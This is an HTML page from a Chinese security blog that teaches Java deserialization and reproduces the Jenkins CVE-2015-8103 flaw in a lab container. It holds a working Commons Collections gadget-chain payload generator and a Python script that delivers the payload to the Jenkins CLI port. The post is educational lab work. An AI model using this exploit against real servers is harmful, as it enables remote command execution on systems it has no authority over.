@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Java反序列之从萌新到菜鸟 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2019/01/Java反序列之从萌新到菜鸟/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                    </div>
+                    <h1>Java反序列之从萌新到菜鸟</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2019-01-18
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>距离上一次更新博客差不多已经过去一个月了，中间的事情确实也很多。最近勉强把Java的基础给补了，就来记录一下Java中最经典的反序列化漏洞。</p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>Java中并非所有的数据类型都可以进行序列化，想要进行序列化和反序列化的数据结构需要使用<code>Serializable</code>这样一个接口。例如下面这个类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String identify;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// setter and getter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后通过如下方式，就可以将一个类进行序列化，变成可持久化存储的二进制数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        FileOutputStream fileOut = <span class="keyword">new</span></span><br><span class="line">            FileOutputStream(<span class="string">"1.bin"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">        out.writeObject(e);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">        System.out.println(<span class="string">"Serialized data is complete."</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException i)&#123;</span><br><span class="line">        i.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以来看一下生成的序列化数据</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/1.png" alt></p>
+<ul>
+<li><code>0xaced</code>，魔术头</li>
+<li><code>0x0005</code>，版本号 <em>（JDK主流版本一致，下文如无特殊标注，都以JDK8u为例）</em></li>
+</ul>
+<p>开头的几位一般来当作Java序列化字节的特征。</p>
+<p>可以看到Java的序列化数据没有像PHP一样那么容易被人理解，是以一种字节码的形式进行保存的。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Employee e = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"1.bin"</span>);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        e = (Employee) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">    &#123;</span><br><span class="line">        i.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(ClassNotFoundException c)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">"Employee class not found"</span>);</span><br><span class="line">        c.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(e.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过以上的方式，就可以将序列化后的字节码重新反序列化程程序中的类。</p>
+<h2 id="SerialVersionUID"><a href="#SerialVersionUID" class="headerlink" title="SerialVersionUID"></a>SerialVersionUID</h2><p>相比PHP中的反序列化，Java中做了更多的安全检测机制，例如<code>SerialVersionUID</code></p>
+<p>当类中没有自定义这个值的时候，会通过一系列的Hash算法自动生成这个值，详细的可以看<a href="https://xz.aliyun.com/t/3847#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847#toc-3</a></p>
+<p>简而言之就是当反序列化时的类与序列化时候的类“不一致”（例如类中的方法和原先的不一致）的时候，不会允许你进行反序列化。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/2.png" alt></p>
+<h1 id="反序列化的利用"><a href="#反序列化的利用" class="headerlink" title="反序列化的利用"></a>反序列化的利用</h1><h2 id="相较PHP的一些利用"><a href="#相较PHP的一些利用" class="headerlink" title="相较PHP的一些利用"></a>相较PHP的一些利用</h2><p>反序列化的主要攻击方式，就是控制类中的数据，然后带入到危险函数中进行攻击。</p>
+<p>1、由于Java中不存在PHP中那么多的魔术方法，所以这一条路可以算是gg了。</p>
+<p>2、由于在反序列化的时候都会进行一次类型转换，如果序列化成了其他类，这里也会抛出异常。在这之前，除了<code>readObject()</code>方法，并没有调用过其他方法。从而序列化其他类进而触发一些危险方法也变的十分困难。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/3.png" alt></p>
+<p>3、然后就是当原先类的方法中存在危险函数，又正好在反序列化之后被调用了，就可以引发危害。但是感觉遇到的机会实属小。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/4.png" alt></p>
+<p>4、然后就是Java中最常用的一种利用方式</p>
+<p>可以观察到，在每个反序列化的过程中，都会调用<code>readObject()</code>这个方法</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/5.png" alt></p>
+<p>前辈大佬们就去寻找重写了这个方法的类，并配合<code>invoke</code>反射的机制，构造pop链，形成了Java中最具特色的反序列化攻击。</p>
+<h2 id="CommonsCollections反序列化"><a href="#CommonsCollections反序列化" class="headerlink" title="CommonsCollections反序列化"></a>CommonsCollections反序列化</h2><h3 id="transform-反射机制"><a href="#transform-反射机制" class="headerlink" title="transform()反射机制"></a>transform()反射机制</h3><blockquote>
+<p>以下内容摘自 <a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
+</blockquote>
+<blockquote>
+<p>Commons Collections实现了一个<code>TransformedMap</code>类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入。</p>
+<p>我们可以通过<code>TransformedMap.decorate()</code>方法，获得一个<code>TransformedMap</code>的实例。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/6.png" alt></p>
+<blockquote>
+<p>当<code>TransformedMap</code>内的key 或者 value发生变化时，就会触发相应的<code>Transformer</code>的<code>transform()</code>方法。另外，还可以使用<code>Transformer</code>数组构造成<code>ChainedTransformer</code>。当触发时，<code>ChainedTransformer</code>可以按顺序调用一系列的变换。而Apache Commons Collections已经内置了一些常用的<code>Transformer</code>，其中<code>InvokerTransformer</code>类就是今天的主角。</p>
+<p>它的transform方法如下：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/7.png" alt></p>
+<blockquote>
+<p>这个<code>transform(Object input)</code> 中使用Java反射机制调用了input对象的一个方法，而该方法名是实例化<code>InvokerTransformer</code>类时传入的<code>iMethodName</code>成员变量： </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/8.png" alt></p>
+<p>也就意味着，我们现在可以完全控制其中的反射部分</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/9.png" alt></p>
+<p>然后利用反射机制，动态调用其它类中的方法。通过以下的链式调用，就可以命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">            String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">                                                     Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                               new Object[]&#123;"calc"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    normalMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"></span><br><span class="line">    Map transformedMap = TransformedMap.decorate(normalMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">    Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在最后重新set了Value的值之后，就触发了了<code>Transformer的transform()</code>方法 。</p>
+<p>就相当于利用反射机制，链式执行了系统命令</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/10.png" alt></p>
+<p>可以在运行之后，就能看到弹出的计算器。</p>
+<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>然后需要找到一个重写了<code>readObject</code>方法，并且对其中的一个<code>Map</code>类型成员变量进行重新赋值的这样一个类。于是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这样一个原生的包中，就存在这样一个类。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/11.png" alt></p>
+<p>这样，我们就可以反序列化这个类，将其成员变量<code>memeberVaules</code>反序列化成之前的那个<code>TransformedMap</code>，利用反射机制，就可以命令执行。</p>
+<h1 id="Jenkins-反序列化-CVE-2015-8103"><a href="#Jenkins-反序列化-CVE-2015-8103" class="headerlink" title="Jenkins 反序列化 CVE-2015-8103"></a>Jenkins 反序列化 CVE-2015-8103</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>在2015爆出的Commons Collections反序列化之后，众多厂商都躺枪，今天挑了一个<code>Jenkins</code>的反序列化，通过手工构造Payload的形式，复现当年的反序列化漏洞。</p>
+<p>靶场环境: <a href="https://github.com/Medicean/VulApps/tree/master/j/jenkins/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/j/jenkins/1</a></p>
+<p>不过这个漏洞的端口并不是在应用的web端口，而是在Jenkins的CLI端口（一般是一个随机的大端口），在靶场里是固定的50000</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>通过wireshare进行流量包的抓取之后，可以看到其中存在Java反序列化的特征值<code>ac ed 00 05</code>的base64编码之后的值<code>rO0AB</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/12.png" alt></p>
+<p>所以，只要我们模拟之前的TCP通信，并将这段base64编码的数据替换成我们恶意构造的序列化数据，就可以达成反序列化攻击。</p>
+<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>生成序列化字节</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">            String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">                                                     Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                               new Object[]&#123;"touch /tmp/eval"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    normalMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"></span><br><span class="line">    Map transformedMap = TransformedMap.decorate(normalMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line">    Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">    File f = <span class="keyword">new</span> File(<span class="string">"eval.bin"</span>);</span><br><span class="line">    ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">    out.writeObject(instance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用python进行socket通信</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">sock_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">cli_listener = (socket.gethostbyname(host), <span class="number">50000</span>)</span><br><span class="line">print(<span class="string">'[+] Connecting CLI listener %s:%s'</span> % cli_listener)</span><br><span class="line">sock_fd.connect(cli_listener)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[+] Sending handshake headers'</span>)</span><br><span class="line">headers = <span class="string">'\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'</span></span><br><span class="line">sock_fd.send(headers)</span><br><span class="line">sock_fd.recv(<span class="number">1024</span>)</span><br><span class="line">sock_fd.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">payload_obj_b64 = sys.argv[<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">'\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'</span></span><br><span class="line">payload += payload_obj_b64</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[+] Sending payload'</span>)</span><br><span class="line">sock_fd.send(payload)</span><br><span class="line">print(<span class="string">'[+] Send All'</span>)</span><br></pre></td></tr></table></figure>
+<p>手动传入base64之后的数据</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/13.png" alt></p>
+<p>之后就可以在docker中看到/tmp目录下生成的<code>eval</code>文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Java反序列之从萌新到菜鸟/14.png" alt></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>亲手完成了这些反序列化的过程感觉还是可以的，以后实际构造payload时可以利用<code>ysoserial</code>这个工具，里面有很多已经构造好了的pop链，Java反序列化必备神器。</p>
+<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>感觉Java的漏洞需要的前置知识还是有蛮多的，比PHP的入门门槛要高一截。</p>
+<p>最后，由于一些原因，以后博客可能也不能像之前更的那么勤快了。但会努力不让它太荒废的。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
+<p><a href="https://github.com/Medicean/VulApps/tree/master/j/jenkins/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/j/jenkins/1</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/05/SPEL表达式注入-入门篇/" data-toggle="tooltip" data-placement="top" title="SPEL表达式注入-入门篇">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/11/Code-Breaking-Puzzles-题解-学习篇/" data-toggle="tooltip" data-placement="top" title="Code-Breaking Puzzles 题解&学习篇">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
